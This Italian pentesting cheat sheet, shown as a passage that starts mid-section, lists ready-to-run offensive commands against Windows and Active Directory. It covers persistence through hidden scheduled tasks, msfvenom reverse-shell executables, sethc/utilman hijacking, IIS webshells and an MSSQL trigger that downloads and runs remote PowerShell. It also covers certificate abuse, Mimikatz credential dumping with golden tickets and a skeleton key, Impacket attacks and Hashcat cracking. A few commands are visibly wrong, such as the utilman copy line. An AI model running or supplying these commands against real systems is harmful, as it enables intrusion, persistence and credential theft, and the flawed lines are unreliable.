Stop-Service -Name ntds -force #comando per fermare il servizio ntds, in quanto bisogna apportare delle modifiche al DB dell'AD
```
_Ora entra in gioco un [tool](https://github.com/MichaelGrafnetter/DSInternals) che ci permette di modificare la SID history_
```powershell
Add-ADDBSidHistory -SamAccountName '<nome SAM>' -SidHistory '<SID che vogliamo aggiungere>' -DatabasePath C:\Windows\NTDS\ntds.dit #comando per aggiungere il SID al NTDS.dit
```
```powershell
Start-Service -Name ntds #comando per riavviare il servizio ntds
```
- __Task Scheduler:__

_Il Task scheduler oltre ad essere fonte di [Privilege escalation](./#privilege-escalation) è utilizzato nella persistence tramite la creazione di un nuovo task o della modifica di uno già esistente_

_Comandi:_
```cmd
schtasks /create /sc minute /mo 10 /tn <nome task> /tr "<path programma o comando da eseguire" /ru <utente che lo esegue> #creazione di un task che si esegue ogni 10 minuti
```
```cmd 
schtasks /query /tn <nome task> #comando per vedere lo stato del nostro task
``` 
_Vi è la possibilità di rendere invisibile un task, andando ad eliminare il suo secure descriptor(SD) nelle chiavi di registro._      
```cmd
regedit #comando per aprire regedit
```
```cmd 
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\<nome task da modificare> #path dove si trova SD del task da eliminare
```
``` 
SD #nome del valore da eliminare
``` 
_Andando a fare una query del nostro task potremmo vedere che vi sarà un errore del sistema siccome non lo troverà._

- __Cartella Startup:__

_Ogni utente in un sistema windows dispone di una propria cartella che quando viene effettuato il login avvia degli eseguibili, quindi con i permessi necessari potremmo inserire un nostro payload_

_Comandi:_
```
C:\Users\<nome utente>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup #path della cartella startup
```
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<porta> -f exe -o <nome eseguibile>.exe #comando per creare un'eseguibile con revshell
```
_Ora va passato sulla target machine e inserito nella path della cartella startup._

- __WinLogon:__

_Spiegazione di WinLgon [qui](./#processi-di-avvio)_

_WinLogon sfrutta delle chiavi di registro alla path __"HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"__, e due sono i value interessanti __"UserInit"__ che ha il compito di caricare le preferenze dell'utente e __"Shell"__ che nella maggior parte dei casi punta a explorer.exe; aggiungendo una semplice virgola a __"Shell"__ possiamo fare in modo di avviare un nostro eseguibile_

_Comandi:_
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<porta> -f exe -o <nome eseguibile>.exe #comando per creare un'eseguibile con revshell
```
```cmd
regedit -> HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\UserInit-> explore.exe, <path del nostro eseguibile> #passi per modificare la chiave Shell
```
_Altro metodo di persistenza quando si esegue il logon è andare alla seguente path __"HKCU\Environment"__ e creare una nostra variabile d'ambiente di nome __"UserInitMprLogonScript"__ che punti al nostro eseguibile e ogni volta che avviene un logon si avvierà._

- __Tasti Permanenti:__

_Quando viene premuto rapidamente per 5 volte di seguito il tasto SHIFT, windows aprirà un'eseguibile di nome __"setch.exe"__, sostituendolo avremmo la possibilità di eseguire un nostro eseguibile anche prima della schermata di login._

_Comandi:_
```cmd
takeown /f C:\Windows\System32\sethc.exe #comando per prendere il controllo dell'eseguibile
```
```cmd
icacls C:\Windows\System32\sethc.exe /grant Administrator:F #comando per darsi i permessi sull'eseguibile
```
```cmd
copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe #sostituzione dell'eseguibile con un CMD di user SYSTEM
```
- __Utilman:__

_Utilman è un'eseguibile che fornisce delle opzioni di accesso semplificato prima del login, anche in questo caso avendo i giusti permessi, possiamo sostituire l'eseguibile __"utilman.exe"__ con un __"cmd.exe"___

_Comandi:_
```cmd
takeown /f C:\Windows\System32\utilman.exe #comando per prendere il controllo dell'eseguibile
```
```cmd
icacls C:\Windows\System32\utilman.exe /grant Administrator:F #comando per darsi i permessi sull'eseguibile
```
```cmd
copy c:\Windows\System32\utilman.exe C:\Windows\System32\sethc.exe #sostituzione dell'eseguibile con un CMD di user SYSTEM
```
- __IIS:__

_Inserendo una webshell all'interno della root del server IIS potremmo loggare come utente del servizio con i relativi privilegi annessi, tra cui uno molto importante [SeImpersonatePrivilege](./#varie)_

_Comandi:_
```cmd
move <nome webshell>.aspx C:\inetpub\wwwroot\ #comando per copiare la webshell nella root dell'IIS
```
```cmd
icacls <nome webshell>.aspx /grant Everyone:F #comando per darsi il controllo totale sulla webshell
```
```
http://<ip target/<nome webshell>.aspx #Url da visitare e attivare la webshell
```
- __Mysql:__

_Mysql è presente in molti sistemi e può essere utilizzato per i nostri scopi_

_Comandi:_
```
Microsoft SQL Server Management Studio-> accesso con le credenziali dell'user-> nuova query #passi per fare una query
```      
_Query:_
```sql
sp_configure 'Show Advanced Options',1;
RECONFIGURE;
GO #query che attiva le opzioni avanzate
```
```sql      
sp_configure 'xp_cmdshell',1;
RECONFIGURE;
GO #query che avvia la xp_cmdshell
```
```sql        
USE master

GRANT IMPERSONATE ON LOGIN::<nome account admin> to [Public]; #comando che da i privilegi a tutti gli utenti, impersonandosi come admin del DB
```
```sql 
USE HRDB #utilizzo del DB HRDB

CREATE TRIGGER [backdoor]
ON HRDB.dbo.Employees 
FOR INSERT AS
      
EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://<ip>:<porta>/<script>.ps1'')"';
#query che crea un trigger che si connette ad uno nostro webserver e scarica il nostro script.ps1
```    
- __Certificati:__

_la spiegazioni sui certificati la si trova [qui](./#certificati-ad)_

_Comandi:_
```cmd
certutil -v -template #comando per listare i template
```      
_caratteristiche dei template che interessano a noi:_

 1) template con i permessi di poter richiedere un certificato quali Allow Enroll o Allow Full Control
```
#Lo si trova greppando per ogni parola di Allow Enroll o Allow Full Control per poi vedere se il gruppo che ha questi privilegi è il gruppo in cui poi apparteniamo anche noi
```
 2) template che permetta l'autenticazione del client che verrà in seguito utilizzata per l'autenticazione al kerberos
```
#per trovarlo bisogna andare a vedere le proprietà della voce EKU e trovare la parola Client Authentication
```
 3) template che permette di alterare il SAN (subject alternative name)
```
#Lo si trova greppando per CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT, se settato a 1 possiamo modificare il SAN
```
_Un template avendo le 3 caratteristiche elencate sopra potrà essere utilizzato a nostro vantaggio_

_Viene inserito sia il metodo con GUI e tramite tools su CLI:_

- __Metodo GUI:__
```cmd
mmc #comando per aprire microfsoft management console
```
```
File-> aggiungi/rimuovi snap-in-> Certificati-> selezioniamo il mio account utente #passi per creare un certificato generale
```
__N.B: senza privileggi possiamo selezionare solo account utente e non account servizi o account computer quando creiamo il certificato generale__
```
Console Root-> Certificati-> Personale-> tutte le attività-> richiedi nuovo certificato-> avanti-> scritta blu maggiori informazioni sono richieste #passi per creare il certificato personalizzato
```
```
#ora va inserito l'UPN dell'user che vogliamo impersonare nel campo SAN
```
```powershell
Get-ADUser | fl * #comando per trovare gli user con UPN annesso se presente
```
```
#invece nel campo nome soggetto va cambiato con nome comune
```
```
Ok-> Enroll-> ora il certificato sarà pronto e deve essere esportato-> click destro sul certificato-> tutte le attività -> esporta-> selezionare si per   
esportare la chiave privata -> configurare una password -> avanti e verrà esportato #passi per salvare ed esportare il certificato con la relativa chiave privata
```
__Esportare il certificato con chiave privata annessa è possibile anche con [Mimikatz](./#mimikatz)__

_Ora non dobbiamo fare altro che prenderci il kerberos ticket_

link per scaricare [rubeus](https://github.com/GhostPack/Rubeus)
```cmd
Rubeus.exe asktgt /user:<nome utente che deve coincidere con quello dell'UPN> /enctype:aes256 /certificate:<path del certificato> /password:<password certificato> /outfile:<file dove verrà salvato il TGT> /domain:<dominio> /dc:<ip> #comando per richiedere il TGT tramite il nostro certificato
```
```cmd
Rubeus.exe changepw /ticket:<path al file TGT> /new:<nuova password> /dc:<dominio> /targetuser:<dominio>\<user> #comando per cambiare password dell'account che vogliamo attaccare
```
_Comandi per creare il certificato da CMD con il tool [ForgeCert](https://github.com/GhostPack/ForgeCert)_
```cmd
ForgeCert.exe --CaCertPath <certificato esportato>.pfx --CaCertPassword <password> --Subject CN=<nome> --SubjectAltName <UPN> --NewCertPath <path o nome dove salvare il file>.pfx --NewCertPassword <nuova password> #comando per creare il nostro certificato
```
- __Metodo CLI:__

_Verifichiamo per eventuali vulnerabilità nei certificati_
```cmd
.\Certify.exe find /vulnerable #comando per cercare vulnerabilità
```
```cmd
.\Certify.exe request /ca:<dominio CA> /template:UserCert /altname:<nome utente> #comando per ottenere certificato con chiave privata
```
_Copiare chiave privata e certificato in file chiamato __"cert.pem"___
```bash
sed -i 's/\s\s+/\n/g' cert.pem #comando per formattare per bene il cert.pem
```
```bash
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx aggiungere una password per esportare #comandi per creare il certificato in formato PFX
```
_Ora va importato nella target machine e tramite [rubeus](https://github.com/GhostPack/Rubeus) richiediamo il TGT_
```cmd
Rubeus.exe asktgt /user:<nome utente che deve coincidere con quello dell'UPN> /enctype:aes256 /certificate:<path del certificato> /password:<password certificato> /outfile:<file dove verrà salvato il TGT> /domain:<dominio> /dc:<ip> #comando per richiedere il TGT tramite il nostro certificato
```
# Tools:

_Tool utile per l'audit dei certificati scaricabile [qua](https://github.com/GhostPack/PSPKIAudit)_

### Metasploit:

_Metasploit è un framework molto utilizzato nel mondo del pentesting, in quanto al suo interno si possono trovare numerosi exploit, vulnerabilità e payload; metasploit dispone dei moduli, che possono essere di diverse tipologie:_

__Moduli:__

_I moduli li troviamo alla seguente path __"/usr/share/metasploit-framework/modules"__, sono il cuore principale dello stesso framework e sono divisi in:_

1) Auxiliary = modulo di supporto dove troviamo crawler, scanner, listener e revshell

2) Exploits = modulo contenente gli exploits
 
3) Post = modulo utilizzato per la post-exploitation

4) Encoders = modulo che permette di encodare il proprio payload

5) Payload = modulo contente vari payload

6) Plugins = script ulteriori da poter utilizzare

_Nel modulo payload poi abbiamo delle sottocategorie:_ 

- Adapters = adatta un payload in differenti formati tipo in un bash command

- Stageless = Payload che runna nel computer vittima da sola, cioè senza componenti ulteriori da scaricare (__"_"__ è indicato con l'underscore __"msfvenom -p windows/x64/meterpreter_reverse_tcp__")

- Staged = Payload che prima viene runnato nel computer vittima e che poi deve scaricare il resto del payload detto __"Stage"__ (__"/"__ è indicato __"msfvenom -p windows/x64/meterpreter/reverse_tcp__")

_Sintassi dei moduli:_
```bash
<Numero> <tipo>/<OS>/<servizio>/<nome> #sintassi dei moduli in metasploit
```

_ExploitDB e Metasploit:_

_Meterpreter non può contenere tutti gli exploit ma possiamo integrarli con payload custom o [exploitDB](https://www.exploit-db.com/) o sennò più velocemente con il comando:_

```bash
searchsploit -u #comando che aggiorna searchsploit
```
```bash
searchsploit -t <nome exploit> --exclude="<nome estensione>" #comando che sfrutta la cli di exploitDB per ricercare i payload tramite titolo e esclusione dell'estensione
```

_Una volta trovato l'exploit andrà importato come nell'esempio:_

`searchsploit PHP 5.4.3 - apache`

_output comando:_

`PHP 5.4.3 - apache_request_headers Function Buffer Overflow (Metasploit) windows/remote/19231.rb`

_Ora prestiamo attenzione alla path __"windows/remote/"__ perchè queste stesse cartelle andranno create nella directory __"/usr/share/metasploit-framework/modules/exploits"__ quindi il risultato sarà __"/usr/share/metasploit-framework/modules/exploits/windows/remote"__; una volta create le directory andrà copiato lo script all'interno e avviato msfconole_

`sudo cp /usr/share/exploitdb/exploits/windows/remote/19231.rb /usr/share/metasploit-framework/modules/exploits/windows/remote/`

`msfconsole -m /usr/share/metasploit-framework/modules/`

__N.B: Metasploit utilizza solamente script in ruby ".rb"__

__Plugins:__

_I Pluging localizzatti in __"/usr/share/metasploit-framework/plugins/"__ possono migliore e automatizzare dei processi, i plugin possono essere aggiunti manualmente da noi_

__Scripts:__

_Gli scrips li troviamo in __"/usr/share/metasploit-framework/scripts/"__, tra cui __"Meterpreter"___

__Tools:__

_Tool che si possono utilizzare con __"msfconsole"__ si trovano in __"/usr/share/metasploit-framework/tools/"___

__N.B: Appuntarsi almeno le path di ogni componente è importante se vogliamo aggiungere noi qualcosa manualmente__

- _Comandi Msfconsole:_
```bash
sudo apt update && sudo apt install metasploit-framework #comando per installare metasploit
```
```bash
history #comando per vedere l'history dei comandi
```
```bash
show #comando per listare i moduli
```
```bash
sessions -i <num sessione> #comando per riprendere ad utilizzare una sessione in background
```
```bash
search <nome generico o path specifica> #comando per ricercare in un modulo 
```
ES: `search exploit/unix/webapp/moinmoin_twikidraw o search moinmoin`
```bash
use <path modulo o num della lista> #comando per utilizzare un modulo specifico
```
ES: `use exploit/unix/webapp/moinmoin_twikidraw o use 1`
```bash
info #comando che da informazioni sul modulo selezionato
```
```bash
show options #comando per vedere le opzioni da inserire nel modulo da utilizzare
```
```bash
show targets
set target <num target> #comando che funziona dopo aver selezionato un modulo, ci mostra i target affetti da un determinato exploit e ci permette di selezioarli
```
```bash
set <nome opzione> <valore opzione> #comando per settare l'opzione di un modulo selezionato
```
ES: `set RHOSTS 1.1.1.1`
```bash
unset all #comando per svuotare le varie opzioni settate
```
```bash
back #comando per uscire dal modulo selezionato e tornare alla msfconsole
```
```bash
exploit o run #comandi per avviare l'exploit o il modulo selezionato
```
- _Comandi Meterpreter:_
```bash
background #comando che una volta stabilita una sessione la manda in background permettendoci di svolgere altre operazioni
```
```bash
ps #comando per listare i processi sulla target machine
```
```bash
migrate <pid processo> #comando per migrare da un processo ad un altro
```
```bash
getuid #comando per sapere che user siamo
```
```bash
keyscan_start keyscan_dump keyscan_stop #comandi per iniziare, scaricare il dump e fermare il keylogger in metasploit
```
```bash
shell #comando per avviare una shell
```
```bash
load kiwi #comando per avviare mimikatz
```
```bash
execute -f <powershell/cmd.exe> <cose eseguire> #comando per eseguire comandi interni
```
- _Comandi Payload:_
```bash   
msfvenom -a x64 -p windows/x64/exec CMD='<comando cmd>' -f <linguaggio> #comando per generare un payload che esegue un solo comando cmd
```
```bash
msfvenom -a x86 --platform Windows LHOST=<ip> LPORT=<porta> -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b '<byte da escludere>' -i <num iterazione> -f <linguaggio> #comando che genera una revshell con obfuscazione
```
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<porta> -f exe --encrypt xor --encrypt-key "<chiave>" -o <nome eseguibile>.exe #comando per generare una revshell criptata
```
```bash    
msfvenom -x <nome eseguibile falso>.exe -k -p windows/shell_reverse_tcp lhost=<ip> lport=<porta> -f exe -o <nome eseguibile>.exe #comando che genera una revshell all'interno di un finto eseguibile
```

- _Comandi DB metasploit:_

_Metasploit permette di utilizzare un db locale per tenere traccia dei propri progressi durante un PT_

```bash  
sudo systemctl start postgresql
sudo service postgresql status #comandi per avviare e controllare lo stato del db
```
```bash
sudo apt update && sudo msfdb init #comando per avviare l'istanza di MSF database
```
```bash
sudo msfdb status #comando per controllare lo stato del MSF database
```
```bash
sudo msfdb run #comando per runnare MSF database
```
```bash
sudo msfdb reinit
cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
sudo service postgresql restart
msfconsole -q  #versione compatta dei comandi per ristartare in fretta il db
```
```bash
help database #comando per aprire l'help del database
```
```bash
workspace #comando per listare le workspace nel db, le workspace sono simili a cartelle contenenti tutti i dati da noi inseriti
```
```bash
workspace -h #comando per aprire l'help delle workspace
```
```bash
workspace -a/-d <nome> #comando per aggiungere/rimuovere una workspace
```
```bash
db_import <nome file> #comando per importare un file nel db
```
```bash
db_nmap -sV -sS <ip> #comando per eseguire nmap ed importare i risultati nel db
```
```bash
db_export -h #comando per aprire l'help
```
```bash
db_export -f xml <nome file>.xml #comando per esportare dal db
```
```bash
hosts -h #comando per aprire l'help di hosts, da cui possiamo aggiungere host, hostnames
```
```bash
services -h #comando per aprire l'help dei servizi dove possiamo aggiungerli anche manualmente
```
```bash
creds -h #comando per aprire l'help delle creds dove possiamo anche aggiungerle manualmente
```
```bash
loot -h #comando per aprire l'help di loot, il quale ci da una panoramica delle informazioni recuperate
```
- _Comandi Reverse/Port forwarding e pivoting:_

_Viene scritta una piccola sezione di questi comandi perchè sono ricollegabili alla sezione di [Port Forwarding](./#port-forwarding)_
```bash
use auxiliary/server/socks_proxy #comando che usa il modulo socks_proxy
set SRVPORT 9050 #campo per indicare la porta 
set SRVHOST 0.0.0.0 #campo per indicare indirizzo ip 
set version 4a #campo che indica la versione
run #comando per avviare il modulo
```      
__N.B: Prestare attenzione alla versione selezionata nel modulo socks_proxy deve coincidere con quella nel file /etc/proxychains.conf__
```bash
use post/multi/manage/autoroute #comando che avvia il modulo autorute, per impostare le route
set sesssions 1 #campo che indica la sessione da utilizzare
set SUBNET <ip> #campo che indica la subnet 
run #comando per avviare il modulo
```
```bash
run autoroute -s <ip route> #comando alternativo per aggiungere manualmente una route, lanciato da meterpreter
run autoroute -p #comando che lista la routing table, lanciato da meterpreter
```
```bash
help portfwd #comando che runnato in msfoconsole apre l'help per il portfwd
portfwd add -l <porta locale> -p <porta remota> -r <ip remoto> #comando che binda la porta locale a quella remota, lanciato da meterpreter
portfwd add -R -l <porta locale> -p <porta remota> -L <ip remoto> #comando utilizzato per una reverse shell via port forwarding e binda la porta locale a quella lanciato da meterpreter 
remota poi una volta attivata la revshell che andrà a puntare prima alla porta remota che poi tramite forward arriverà alla nostra macchina
```
ES: 
`portfwd add -l 3300 -p 3389 -r 192.168.9.1`

`freerdp /v:localhost:3300 /u:user /p:password`

_Ulteriore sottosezione con dei moduli utili per il pivoting e la scansione delle reti_
```bash
run post/multi/gather/ping_sweep RHOSTS=<ip> #comando utile per la scansione di host tramite il comando ping, lanciato da meterpreter
```
ES: `run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/24`

__N.B: Prestare attenzione ai bit dedicati agli utenti nella subnet__

### Powerview:

_[Powerview](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1), facente parte del framework Powersploit è uno script molto utile nella fase di recognition ed enumerazione_

_Comando per scaricare PowerView.ps1 sulla macchina e avviarlo:_
```powershell
    Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
    powershell -ep bypass
    . .\PowerView.ps1
```
_dopo aver avviato powerview abbiamo a disposizione dei comandi aggiuntivi per un'enumerazione completa della macchina vittima:_
```powershell
Get-NetUser #comando che ottiene le informazioni sugli utenti
```
```powershell
Get-NetUser | select cn #comando per ottenere solo il common name
```
```powershell
Get-NetUser -TrustedToAuth #comando per ottenere gli utenti che possono autenticarsi tramite trust o delegation
```
```powershell
Get-NetGroup #comando che ottiene tutti i gruppi presenti a dominio
```
```powershell
Get-NetGroup -GroupName *admin* #comando che ottiene tutti i gruppi in cui è presente la parola admin
```
```powershell
Invoke-ShareFinder #comando che ottiene tutte le shares smb del dominio
```
```powershell
Get-NetComputer -FullData #comando che ottiene tutte le informazioni su tutti i pc della rete
```
```powershell
Get-NetComputer -FullData | Select-Object logoncount #comando per ridurre l'output da parsare selezioniamo l'oggetto specifico come in questo caso per gli accessi 
```
```powershell
Get-DomainUser -Identity <sam account> | Get-DomainSPNTicket -Format Hashcat #comando per recuperare hash account SPN
```
```powershell
Add-DomainObjectAcl -targetidentity "DC=<subdomain>, DC=<top_level_domain>" -principalidentity <nome_utente> -Rights DCSync -verbose 
#comando per aggiungere un oggetto alle ACL
```
_Sopra vengono riportati i comandi utilizzati più di frequente, per una visione più completa dei comandi andare [qui](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)._

### Bloodhund:

_Bloodhound è un tool che permette l'organizzazione delle informazioni ottenute dalla fase di recognition del'AD per utilizzarlo avremmo bisogno di due tools: [bloodhound](https://github.com/BloodHoundAD/BloodHound) e neo4j (database per bloodhound)_
```bash
sudo apt install neo4j && sudo apt install bloodhound #comando per installarli
```
```bash
neo4j console #apriamo la console di neo4j per startare il db
```
_Dobbiamo navigare all'interfaccia web di neo4j (http://localhost:7474/) con le credenziali di default (neo4j:neo4j), una volta effettuato l'accesso ci verrà richiesto di inserire una nuova password a scelta_

_Comando per avviare bloodhund:_
```bash
bloodhound
```
_sulla macchina vittima (windows a dominio) su cui abbiamo RCE eseguiamo questo comando (lo script powershell deve essere passato sulla macchina vittima)_
```powershell
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory "<Path della cartella dove salvare lo zip>"
```
__N.B: "SharpHound è disponibile sia in script .ps1 che in .exe"__

_Infine passiamo il file generato sulla nostra macchina, andiamo all' interfaccia grafica di bloodhound e importiamo il file trascinandolo sopra oppure selezionando l'icona importa mappa._

_Allegati qui abbiamo i 2 eseguibili che hanno il compito di raccogliere i dati per Bloodhund e sono:_

- [SharpHound](https://github.com/BloodHoundAD/SharpHound), utilizzato per l'AD

- [AzureHound](https://github.com/BloodHoundAD/AzureHound), utilizzato per il cloud Azure

### Mimikatz:
_Mimikatz è utilizzato per recuperare hash, password, recupero e creazione di ticket kerberos, per scaricalo andare [qui](https://github.com/ParrotSec/mimikatz)._

__Consigliamo di utilizzare mimikatz integrato con meterpreter per una maggiore praticità.__

__N.B: Alcuni di questi comandi richiedono che venga disattivato LSA del LSASS.__

Comandi:
```cmd
privilege::debug #comando per assicurarsi di runnare mimikatz come amministratore
```
```cmd
token::elevate #comando che tenta di elevare i privilegi
```
```cmd
lsadump::lsa /patch #comando per recupere NTLM hash
```
```cmd
lsadump::sam #comando che tenta il dump del SAM
```
```cmd
lsadump::dcsync /domain:<nome dominio> /all #comando che esegue il dcsync attack su tutti gli utenti
```
```cmd
sekurlsa::pth /user:<nome utente> /domain:<nome dominio> /ntlm:<ntlm hash> #comando per eseguire il pass-the-hash
```
```cmd
sekurlsa::logonpasswords #comando che tenta di recuperare le password in cache
```
```cmd
sekurlsa::credman #comando che tenta di recuperare le password dal credmanager
```
```cmd
sekurlsa::tickets /export #comando per esportare i .kirbi tickets e li recupera da LSASS memoria
```
```cmd
sekurlsa::ekeys #comando che tenta di recuperare le kerberos keys e le password annesse
```
```cmd
sekurlsa::minidump lsass.dmp #comando che se abbiamo la possibilità di dumpare LSASS permette di recuperare le password da esso
```
```cmd
misc::cmd #comando per aprire un cmd 
```
```cmd
kerberos::list #comando per listare i ticket kerberos nel sistema
```
```cmd
kerberos::ptt <ticket> #comando per fare il pass the ticket
```
```cmd   
log <nome file>.txt #comando per creare un file di log
```   
_Golden ticket si ha accesso a tutti i servizi del kerberos._
```cmd
kerberos::golden /user: /domain: /sid:<sid utente> /krbtgt:<NTLM utente> /id:<id utente> #comando per creare un golden ticket
```
```cmd
kerberos::golden /admin:<nome admin> /domain:<dominio> /id:<id> /sid:<sid utente> /krbtgt:<NTLM hash> /endin:<minuti durata del ticket>      
/renewmax:<minuti per il rinnovo del ticket> /ptt #comando che crea sempre un golden ticket ma più completo di varie opzioni
```
_Silver ticket si ha accesso ad un servizio del kerberos è più silenzioso del golden._
```cmd
kerberos::golden /user: /domain: /sid:<sid servizio> /krbtgt:<NTLM servizio> /id:<id servizio> #comando per creare un silver ticket
```
```cmd
kerberos::golden /admin:<nome admin> /domain:<dominio> /id:<id> /sid:<sid servizio> /target:<hostname del dominio> /rc4:>NTLM hash> /service:<servizio> esempio CIFS /ptt #comando che crea sempre un 	 
silver ticket ma più completo di varie opzioni
```
_Comandi per creare la skeleton key_
```cmd  
!+ #comando mimikatz che importa mimidrv.sys
```
```cmd    
!processprotect /process:lsass.exe /remove #comando per disattivare la protezione del LSA
```
```cmd    
misc::skeleton #comando per creare la skeleton key
```
```cmd    
!- #comando per rimuovere mimidrv.sys
```   
_Comandi per i [certificati AD](./#certificati-ad)_
```cmd   
crypto::certificates /systemstore:local_machine #comando per la verifica di certificati nella local machine
```
```cmd   
crypto::capi #comando che utilizza la API CryptoAPI per delle modifiche
```
```cmd   
crypto::cng #comando che modifica il KeyIso di windows
```
```cmd   
crypto::certificates /systemstore:local_machine /export #comando per esportare il certificato
```   
### Impacket:
_Impacket è una suite di script in python molto utili per il pentesting dell'AD_
```bash
sudo pip3 install pipx
python3 -m pipx install impacket
```
```bash
GetUserSPNs.py #sfrutta la vulnerabilità di kerberoasting per ottenere gli SPN(Service Principal Name) dei vari servizi, servono credenziali valide
```
ES:

`GetUserSPNs.py -dc-ip <ip> <dominio>/<utente>`

`GetUserSPNs.py -dc-ip <ip> <dominio>/<utente> -request-user <utente>` 

`GetUserSPNs.py -dc-ip <ip> <dominio>/<utente> -hashes <hash> -request-user <utente>`

```bash
GetNPUsers.py  #sfrutta la misconfigurazione di utenti che non hanno settata la flag UF_DONT_REQUIRE_PREAUTH del kerberos cioè autenticarsi senza richiedere la password
```
ES: 

`GetNPUsers.py <nome dominio>/<nome account> -no-pass`

`GetNPUsers.py <nome dominio>/ -usersfile users.txt`

```bash
secretsdump.py #recupera per recuperare credenziali dal System, Sam e ntds.dit
```
ES:

`secretsdump.py -dc-ip <ip_del_domain_controller> <nome_account>:<passoword>@<ip_domain_controller>`

`secretsdump.py -sam sam.bak -system system.bak LOCAL`

`secretsdump.py -just-dc <dominio>/<utente>@<ip domain controller>`
```bash     
ntlmrelayx.py #ruba le credenziali NTLM quando vengono inviate tra utenti
```
ES: `ntlmrelayx.pyx -6 -t ldaps://<ip_target> -wh wpad.<dominio> -l <directory dove salvare>`
```bash
addcomputer.py #comando per aggiungere un computer a dominio
```
ES: `addcomputer.py -dc-ip <domain controller ip> -computer-name <nome computer> -computer-pass '<password>' '<nome tdl dominio>:<username>:<password>`
```bash
smbserver.py #comando per startar un smb server
```
ES: `smbserver.py <Nomeshare da inserire nel comando di upload> -smb2support <share locale che condividi>`
```bash
mssqlclient.py #comando per connettersi ad un db
```      
ES: 

`mssqlclient.py <nome utente sql>@<ip> -windows-auth`

`help`

`enable xp_cmdshell`

`xp_cmdshell whoami /priv`
```bash
exchanger.py #comando per connettersi ad un windows exchange
```
ES: `exchanger.py <dominio>/<nome utente>:"<password>"@<mail> nspi list-tables`
```bash
samrdump.py #comando che tramite il samr (Security Account Manager Remote) named pipe tenta di recuperare delle informazioni
```
ES: `samrdump.py <ip>`
```bash
smbpasswd.py #comando che da remota cambia la password di un account
``` 
ES: `smbpasswd.py  <dominio>/<utente target>:<password vecchia>@<ip>  -newpass <nuova password>`
```bash
psexec.py #comando simile a psexec della suitesysinternal che permette di inviare comandi da remoto
``` 
ES: `psexec.py <dominio>/<nome utente>:'<password>'@<ip>` 
```bash
wmiexec.py #comando che si connette tramite wmi, crea una shell semi-interattiva e a livello di log causa poco rumore
```
ES: `wmiexec.py <dominio>/<nome utente>:'<password>'@<ip>`
### Hashcat:

_Hashcat è il più famoso tool di cracking per le password, può essere scaricato [qui](https://hashcat.net/hashcat/)_

_Comandi generali:_
```bash
sudo apt install hashcat #comando per installare hashcat
```
```bash
hashcat -h #comando per aprire l'help di hashcat
```
```bash
hashcat <nome file hash< #comando per far partire l'autorilevamento di hash del tool
```
```bash
hashcat --example-hashes #comando per aprire gli esempi di hashes
```
```bash
hashcat -b -m <num hash> #comando per attivare il benchmark su un tipo di hash
```
```bash
hashcat.potfile #path file dove vengono salvati gli hash craccati
```
_[Link](https://github.com/hashcat/hashcat-utils) agli hashcat-utils, bianri che possono ampliare l'utilizzo di hashcat_

1) Attacco a dizionario:

_L'attacco a dizionario __(num 0)__ consiste nel provare tutte le password provenienti da una wordlist, le più famose sono la [Seclists](https://github.com/danielmiessler/SecLists) o [Rockyou](https://github.com/praetorian-inc/Hob0Rules/blob/master/wordlists/rockyou.txt.gz)_

_Comandi:_
```bash
hashcat -a 0 -m <num hash> <file hash> <wordlist di password> #comando che avvia l'attacco a dizionario, la flag "-a" indica il tipo di attacco
```

2) Attacco combinato:

_L'attacco combinato __(num 1)__ è composto da due wordlist di password che vengono poi combinate insieme per eseguire un attacco a dizionario_

_Comandi:_
```bash
hashcat -a 1 -m <num hash> <file hash> <wordlist di password num 1> <wordlist di password 2> #comando che avvia l'attacco combinato
```

3) Attacco a forza bruta:

_L'attacco a forza bruta  __(num 3)__ consiste nel provare tutte le combinazioni possibili finchè non ritorna l'hash esatto, questo attacco diviene nullo se la password è lunga di molti caratteri, una metodologia per ridurre i tentavi è l'aggiunta della maschera, consiste nel creare una propria pattern di caratteri per poter craccare al meglio una password, utilizzando un proprio set si va a diminuire drasticamente il numero totale di possibili tentavi_

_Tabella con i caratteri per l'attacco a maschera:_

```
?u: Lettere maiuscole ASCII (A-Z)

?l: Lettere minuscole ASCII (a-z)

?h: Caratteri esadecimali minuscoli (0123456789abcdef)

?s: Caratteri speciali («spazio»!"#$%&'()*+,-./:;<=>?@[]^_{`)

?H: Caratteri esadecimali maiuscoli (0123456789ABCDEF)

?b: Tutti i byte da 0x00 a 0xff (256 possibili byte)

?d: Cifre (0-9)
```

ES: `Password da craccare = Abete2022 -----> Maschera creata = ?u?l?l?l?l?d?d?d?d`

__N.B: Nell'esempio di sopra per fare capire il concetto viene utilizzata una password molto semplice ma non sempre sarà cosi__

_Comandi:_
```bash
hashcat -a 3 -m <num hash> <file hash> <num charset che va da 1 a 4> <charset> <pattern della maschera scelta> #comando per avviare l'attacco a maschera
```
ES: `hashcat -m 0 -a 3 hash -1 01  'HELLO?l?l?l?l20?1?d'`

4) Attacco Ibrido:

_L'attacco ibrido __"(num 6-7)"__ consiste nell'insieme di utilizzare altri tipi di attacchi in un unico_

_Comandi:_

```bash
hashcat -a 6 -m <num hash> <hash> <wordlist password> <pattern della maschera scelta> #comando 6 che combina attacco a dizionario con attacco a maschera
```

```bash
hashcat -a 7 -m <num hash> <hash>  <pattern della maschera scelta <wordlist password>> #comando 6 che combina attacco a dizionario con attacco a maschera
```

